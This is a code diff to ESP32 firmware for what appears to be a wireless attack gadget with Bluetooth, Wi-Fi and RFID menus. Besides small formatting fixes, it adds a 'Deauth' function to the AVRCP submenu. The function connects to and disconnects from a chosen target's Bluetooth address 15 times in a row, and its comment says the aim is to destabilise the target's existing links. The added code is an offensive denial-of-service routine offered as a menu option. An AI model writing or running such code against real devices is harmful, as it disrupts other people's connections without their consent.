@@ -30,6 +30,7 @@
 #include "esp_system.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+#include "esp_l2cap_bt_api.h"
 
 #define TAG "MENU"
 
@@ -117,14 +118,14 @@ static const char *main_menu_color(int index)
     switch (index)
     {
     case 0:
-        return A_GREEN;  /* Bluetooth */
+        return A_GREEN; /* Bluetooth */
     case 1:
     case 2:
         return A_YELLOW; /* Wi-Fi / RFID */
     case 3:
-        return A_WHITE;  /* Status */
+        return A_WHITE; /* Status */
     case 4:
-        return A_RED;    /* Reboot */
+        return A_RED; /* Reboot */
     default:
         return A_RST;
     }
@@ -409,6 +410,55 @@ static void wait_enter(const char *msg)
  *     output before the menu re-renders.
  *   - Always guard BT operations with g_l2cap_fd checks.
  * ════════════════════════════════════════════════════════════════════════ */
+/* ── Deauth: rapid connect/disconnect to destabilise existing links ─── */
+static void action_deauth(void)
+{
+    /* Check that a target is actually set */
+    bool has_target = false;
+    for (int i = 0; i < ESP_BD_ADDR_LEN; i++)
+    {
+        if (g_target_addr[i] != 0x00)
+        {
+            has_target = true;
+            break;
+        }
+    }
+    if (!has_target)
+    {
+        printf("\n" A_RED "  No target set. Use Device List.\n" A_RST);
+        vTaskDelay(pdMS_TO_TICKS(1500));
+        return;
+    }
+
+    printf("\n  Deauth cycling 15× to "
+           "%02x:%02x:%02x:%02x:%02x:%02x ...\n",
+           g_target_addr[0], g_target_addr[1], g_target_addr[2],
+           g_target_addr[3], g_target_addr[4], g_target_addr[5]);
+    fflush(stdout);
+
+    /* Make sure L2CAP is fully deinitialised before we start cycling */
+    esp_bt_l2cap_deinit();
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    for (int cycle = 1; cycle <= 15; cycle++)
+    {
+        const char *err_str = NULL;
+        esp_err_t ret = do_connect(g_target_addr, &err_str);
+        if (ret != ESP_OK)
+        {
+            printf(A_YELLOW "  Cycle %d: connect failed — %s\n" A_RST,
+                   cycle, err_str ? err_str : "unknown");
+            vTaskDelay(pdMS_TO_TICKS(200));
+            continue;
+        }
+        vTaskDelay(pdMS_TO_TICKS(200)); /* hold the link briefly   */
+        do_disconnect();
+        vTaskDelay(pdMS_TO_TICKS(100)); /* settle before next try  */
+    }
+
+    printf(A_GREEN "  Deauth complete.\n" A_RST);
+    vTaskDelay(pdMS_TO_TICKS(800));
+}
 
 static void action_connect(void)
 {
@@ -839,6 +889,7 @@ static void submenu_avrcp(void)
         MENU_OPT("Volume Up", action_vol_up),
         MENU_OPT("Volume Down", action_vol_down),
         MENU_OPT("Disconnect", action_disconnect),
+        MENU_OPT("Deauth", action_deauth),
         MENU_BACK(),
     };
     loop_options(opts, sizeof(opts) / sizeof(opts[0]), "AVRCP");
